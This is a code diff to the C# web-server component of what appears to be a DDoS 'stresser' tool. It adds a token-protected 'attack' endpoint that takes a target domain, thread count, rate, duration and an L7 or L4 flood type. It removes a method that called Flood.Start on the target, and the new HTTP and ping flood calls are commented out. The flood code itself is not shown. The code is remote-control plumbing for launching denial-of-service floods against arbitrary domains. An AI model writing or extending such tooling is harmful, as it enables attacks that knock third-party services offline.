@@ -20,6 +20,7 @@ namespace Stresser.Services.WebServerService
                 {
                     int port = int.Parse(d_port);
                     IPAddress hostIp;
+                    #pragma warning disable CS8600 // Converting null literal or possible null value to non-nullable type.
                     if (IPAddress.TryParse(d_host, out hostIp))
                     {
                         options.Listen(hostIp, port);
@@ -28,6 +29,7 @@ namespace Stresser.Services.WebServerService
                     {
                         options.ListenAnyIP(port);
                     }
+                    #pragma warning restore CS8600 // Converting null literal or possible null value to non-nullable type.
                 })
                 .Configure(ConfigureApp)
                 .Build();
@@ -49,6 +51,7 @@ namespace Stresser.Services.WebServerService
                     switch (action)
                     {
                         case "status":
+                            Program.hLogger.Log(LogType.Info, $"Got am request for status");
                             await ExecuteStatusAction(response);
                             break;
                         case "attack":
@@ -57,12 +60,23 @@ namespace Stresser.Services.WebServerService
                            form.TryGetValue("threads", out var threads) &&
                            form.TryGetValue("rspt", out var rspt) &&
                            form.TryGetValue("token", out var token) &&
-                           form.TryGetValue("time", out var time))
+                           form.TryGetValue("time", out var time) &&
+                           form.TryGetValue("type", out var type))
                             {
                                 if (token == ConfigHelper.GetSetting("webserver", "token"))
                                 {
                                     Program.hLogger.Log(LogType.Info, $"Attack started on {domain} for {time}s !");
-                                    ExecuteAttackAction(response, domain, threads, rspt, time);
+                                    if (type == "L7")
+                                    {
+                                        #pragma warning disable CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
+                                        //ExecuteHTTPAttackAction(response, domain, threads, rspt, time);
+                                        #pragma warning restore CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
+                                    }
+                                    if (type == "L4") {
+                                        #pragma warning disable CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
+                                        //ExecutePINGAttackAction(response, domain, threads, rspt, time);
+                                        #pragma warning restore CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
+                                    }
                                     await WriteErrorResponse(response, HttpStatusCode.OK, "OK");
                                 }
                                 else
@@ -118,16 +132,6 @@ namespace Stresser.Services.WebServerService
                 status = "OK"
             };
             await WriteJsonResponse(response, HttpStatusCode.OK, statusResponse);
-        }
-
-        private static async Task ExecuteAttackAction(HttpResponse response, string domain, string threads, string delay, string time)
-        {
-            var attackResponse = new
-            {
-                message = $"OK"
-            };
-            await Flood.Start(domain, int.Parse(threads), int.Parse(delay), int.Parse(time));
-            await WriteJsonResponse(response, HttpStatusCode.OK, attackResponse);
         }
 
         private static async Task WriteJsonResponse(HttpResponse response, HttpStatusCode statusCode, object responseObject)
